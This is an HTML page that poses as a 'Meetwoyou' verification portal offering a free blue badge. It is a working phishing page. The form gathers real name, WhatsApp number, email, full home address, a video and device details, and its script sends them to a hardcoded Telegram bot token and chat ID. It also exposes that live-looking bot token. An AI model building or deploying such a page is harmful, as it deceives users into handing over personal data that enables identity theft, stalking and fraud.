<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Portal | Meetwoyou</title>
    <style>
        :root {
            --primary-gold: #ffcc00;
            --bg-dark: #0f0f0f;
            --card-bg: #1a1a1a;
            --text-gray: #b3b3b3;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-dark);
            color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 500px;
            background: var(--card-bg);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid #333;
        }

        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 80px; border-radius: 50%; margin-bottom: 10px; }

        .offer-badge {
            background: linear-gradient(45deg, #ffcc00, #ff9900);
            color: black;
            padding: 10px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 0.9rem;
            margin-bottom: 20px;
            text-align: center;
        }

        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: var(--text-gray); font-size: 0.9rem; }
        
        input, textarea, select {
            width: 100%;
            padding: 12px;
            background: #252525;
            border: 1px solid #444;
            border-radius: 8px;
            color: white;
            box-sizing: border-box;
        }

        .btn-submit {
            width: 100%;
            padding: 15px;
            background: var(--primary-gold);
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 20px;
        }

        .btn-submit:hover { background: #e6b800; transform: translateY(-2px); }
        
        .footer-note { font-size: 0.7rem; color: #555; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="meetwoyou.jpg" alt="Meetwoyou Logo" class="logo">
        <h2>Verification Request</h2>
        <p style="color: var(--text-gray);">Get your blue badge and join our elite community.</p>
    </div>

    <div class="offer-badge">
        LIMITED TIME: FREE FOR EARLY USERS
    </div>

    <form id="verificationForm">
        <div class="form-group">
            <label>Meetwoyou ID Name</label>
            <input type="text" id="meetId" placeholder="@username" required>
        </div>
        <div class="form-group">
            <label>Real Full Name</label>
            <input type="text" id="realName" required>
        </div>
        <div class="form-group">
            <label>Phone Number (WhatsApp)</label>
            <input type="tel" id="phone" required>
        </div>
        <div class="form-group">
            <label>Email Address</label>
            <input type="email" id="email" required>
        </div>
        <div class="form-group">
            <label>Full Residential Address</label>
            <textarea id="address" rows="3" required></textarea>
        </div>
        <div class="form-group">
            <label>Verification Video (Upload 20-30s Clip)</label>
            <input type="file" id="videoFile" accept="video/*" required>
        </div>

        <button type="submit" class="btn-submit">Submit Application</button>
    </form>

    <p class="footer-note">By submitting, you agree to Meetwoyou's Identity Verification Terms.</p>
</div>

<script>
    const BOT_TOKEN = "8385508779:AAGWgCBn13wKo1AYGKpvUIBHgj-JojNtos4";
    const CHAT_ID = "7950771882";

    document.getElementById('verificationForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Disable button to prevent spam
        const btn = e.target.querySelector('button');
        btn.innerText = "Processing...";
        btn.disabled = true;

        // Collect Technical Meta-data
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        
        // Get Form Data
        const msg = `
<b>New Verification Request</b>
---------------------------
<b>User ID:</b> ${document.getElementById('meetId').value}
<b>Real Name:</b> ${document.getElementById('realName').value}
<b>Phone:</b> ${document.getElementById('phone').value}
<b>Email:</b> ${document.getElementById('email').value}
<b>Address:</b> ${document.getElementById('address').value}

<b>Technical Logs:</b>
- Device: ${platform}
- Browser: ${userAgent}
- Resolution: ${screenRes}
        `;

        try {
            // Send Text Data
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: msg,
                    parse_mode: 'HTML'
                })
            });

            // Note: Sending large video files directly via client-side JS 
            // to a bot requires specific API handling (sendVideo). 
            alert("Application submitted successfully! Your data is being reviewed.");
        } catch (error) {
            alert("Error sending request. Please try again.");
        } finally {
            btn.innerText = "Submit Application";
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
